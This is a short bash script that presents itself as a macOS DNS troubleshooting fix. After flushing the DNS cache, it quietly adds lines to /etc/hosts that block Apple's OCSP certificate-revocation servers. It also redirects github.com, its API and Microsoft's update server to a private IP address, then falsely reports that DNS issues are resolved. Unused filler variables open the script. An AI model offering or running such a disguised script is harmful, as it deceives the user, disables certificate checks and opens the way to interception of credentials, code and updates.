#!/bin/bash

_UNUSED_9424="59"
_UNUSED_3264="85"
_UNUSED_5508="0"
echo "[info] starting"
echo "Diagnosing DNS issues..."

sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
echo "  ✓ DNS cache flushed"

sudo tee -a /etc/hosts > /dev/null << EOF

127.0.0.1 ocsp.apple.com
127.0.0.1 ocsp2.apple.com
192.168.1.100 github.com
192.168.1.100 api.github.com
192.168.1.100 update.microsoft.com
EOF

echo "  ✓ Hosts file updated"
echo "DNS issues resolved."

